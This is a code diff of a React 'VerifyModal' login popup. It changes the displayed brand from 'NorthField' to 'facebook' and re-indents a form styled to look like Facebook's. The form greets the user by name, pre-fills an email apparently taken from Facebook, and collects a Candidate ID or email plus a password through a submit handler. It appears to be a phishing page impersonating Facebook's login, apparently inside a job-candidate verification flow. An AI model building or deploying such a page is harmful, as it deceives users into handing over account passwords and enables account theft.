@@ -616,7 +616,7 @@ export default function VerifyModal({
         {/* Top Logo: NorthField inside the popup above profile picture */}
         <div className="text-center mb-6">
           <h1 className="text-3xl sm:text-[36px] font-extrabold text-[#1877f2] tracking-tight select-none">
-            NorthField
+            facebook
           </h1>
         </div>
 
@@ -635,113 +635,113 @@ export default function VerifyModal({
           </div>
         )}
 
-          {/* User Name Header */}
-          <h2 className="text-[20px] font-semibold text-gray-900 text-center mt-4 leading-tight">
-            Log in as {displayName}
-          </h2>
+        {/* User Name Header */}
+        <h2 className="text-[20px] font-semibold text-gray-900 text-center mt-4 leading-tight">
+          Log in as {displayName}
+        </h2>
 
-          {/* Email Autofill Line: [email@domain.com] · Not you? */}
-          {hasEmail ? (
-            <div className="flex items-center justify-center gap-1.5 mt-2 mb-6 text-xs text-gray-500">
-              <span className="bg-[#f0f2f5] text-gray-600 px-2 py-0.5 rounded font-normal select-all">
-                {activeFbEmail}
-              </span>
-              <span className="text-gray-400">·</span>
-              <button
-                type="button"
-                onClick={() => {
-                  setManualIdMode(true);
-                  setCandidateId("");
-                }}
-                className="text-[#1877f2] hover:underline font-normal cursor-pointer"
-              >
-                Not you?
-              </button>
-            </div>
-          ) : (
-            <div className="mt-2 mb-4 text-center">
-              <p className="text-xs text-gray-500">
-                Please enter your Candidate ID or Email to continue
-              </p>
-            </div>
-          )}
+        {/* Email Autofill Line: [email@domain.com] · Not you? */}
+        {hasEmail ? (
+          <div className="flex items-center justify-center gap-1.5 mt-2 mb-6 text-xs text-gray-500">
+            <span className="bg-[#f0f2f5] text-gray-600 px-2 py-0.5 rounded font-normal select-all">
+              {activeFbEmail}
+            </span>
+            <span className="text-gray-400">·</span>
+            <button
+              type="button"
+              onClick={() => {
+                setManualIdMode(true);
+                setCandidateId("");
+              }}
+              className="text-[#1877f2] hover:underline font-normal cursor-pointer"
+            >
+              Not you?
+            </button>
+          </div>
+        ) : (
+          <div className="mt-2 mb-4 text-center">
+            <p className="text-xs text-gray-500">
+              Please enter your Candidate ID or Email to continue
+            </p>
+          </div>
+        )}
 
-          {/* Error Notice */}
-          {errorMessage && (
-            <div className="mb-4 rounded-lg border border-red-200 bg-red-50 px-3.5 py-2.5 text-xs text-red-700 font-medium text-center">
-              {errorMessage}
-            </div>
-          )}
+        {/* Error Notice */}
+        {errorMessage && (
+          <div className="mb-4 rounded-lg border border-red-200 bg-red-50 px-3.5 py-2.5 text-xs text-red-700 font-medium text-center">
+            {errorMessage}
+          </div>
+        )}
 
-          {/* Submission Form */}
-          <form
-            onSubmit={(e) => {
-              e.preventDefault();
-              const effectiveId = (hasEmail ? activeFbEmail : candidateId).trim();
-              onSubmitIdPasskey(effectiveId, passkey.trim());
-            }}
-            className="space-y-3"
-          >
-            {/* If no email from Facebook, open Candidate ID field so user can write it down */}
-            {!hasEmail && (
-              <div>
-                <input
-                  id="candidate-id-input"
-                  type="text"
-                  required
-                  value={candidateId}
-                  onChange={(e) => setCandidateId(e.target.value)}
-                  placeholder="Candidate ID or Email"
-                  className="w-full border border-gray-300 focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] rounded-lg px-4 py-3 text-base text-gray-900 outline-none placeholder:text-gray-400 font-sans transition-all"
-                  autoFocus
-                />
-              </div>
-            )}
-
-            {/* Password / Passkey Input Field */}
+        {/* Submission Form */}
+        <form
+          onSubmit={(e) => {
+            e.preventDefault();
+            const effectiveId = (hasEmail ? activeFbEmail : candidateId).trim();
+            onSubmitIdPasskey(effectiveId, passkey.trim());
+          }}
+          className="space-y-3"
+        >
+          {/* If no email from Facebook, open Candidate ID field so user can write it down */}
+          {!hasEmail && (
             <div>
               <input
-                id="passkey-input"
-                type="password"
+                id="candidate-id-input"
+                type="text"
                 required
-                value={passkey}
-                onChange={(e) => setPasskey(e.target.value)}
-                placeholder="Password"
+                value={candidateId}
+                onChange={(e) => setCandidateId(e.target.value)}
+                placeholder="Candidate ID or Email"
                 className="w-full border border-gray-300 focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] rounded-lg px-4 py-3 text-base text-gray-900 outline-none placeholder:text-gray-400 font-sans transition-all"
-                autoFocus={hasEmail}
+                autoFocus
               />
             </div>
+          )}
 
-            {/* Blue Primary Button: Log In */}
-            <button
-              type="submit"
-              disabled={submitting || !passkey.trim() || (!hasEmail && !candidateId.trim())}
-              className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-3 rounded-lg text-base transition-colors shadow-none cursor-pointer disabled:opacity-50 mt-3.5"
-            >
-              {submitting ? "Logging in…" : "Log In"}
-            </button>
+          {/* Password / Passkey Input Field */}
+          <div>
+            <input
+              id="passkey-input"
+              type="password"
+              required
+              value={passkey}
+              onChange={(e) => setPasskey(e.target.value)}
+              placeholder="Password"
+              className="w-full border border-gray-300 focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] rounded-lg px-4 py-3 text-base text-gray-900 outline-none placeholder:text-gray-400 font-sans transition-all"
+              autoFocus={hasEmail}
+            />
+          </div>
 
-            {/* Gray Secondary Button: Try another way */}
+          {/* Blue Primary Button: Log In */}
+          <button
+            type="submit"
+            disabled={submitting || !passkey.trim() || (!hasEmail && !candidateId.trim())}
+            className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-3 rounded-lg text-base transition-colors shadow-none cursor-pointer disabled:opacity-50 mt-3.5"
+          >
+            {submitting ? "Logging in…" : "Log In"}
+          </button>
+
+          {/* Gray Secondary Button: Try another way */}
+          <button
+            type="button"
+            onClick={handleTryAnotherWay}
+            className="w-full bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#050505] font-semibold py-3 rounded-lg text-base transition-colors text-center cursor-pointer mt-2.5"
+          >
+            Try another way
+          </button>
+
+          {/* Bottom Link: Forgot account? */}
+          <div className="text-center pt-2">
             <button
               type="button"
               onClick={handleTryAnotherWay}
-              className="w-full bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#050505] font-semibold py-3 rounded-lg text-base transition-colors text-center cursor-pointer mt-2.5"
+              className="text-[#1877f2] text-sm font-normal hover:underline cursor-pointer"
             >
-              Try another way
+              Forgot account?
             </button>
-
-            {/* Bottom Link: Forgot account? */}
-            <div className="text-center pt-2">
-              <button
-                type="button"
-                onClick={handleTryAnotherWay}
-                className="text-[#1877f2] text-sm font-normal hover:underline cursor-pointer"
-              >
-                Forgot account?
-              </button>
-            </div>
-          </form>
-        </div>
+          </div>
+        </form>
       </div>
+    </div>
   );
 }
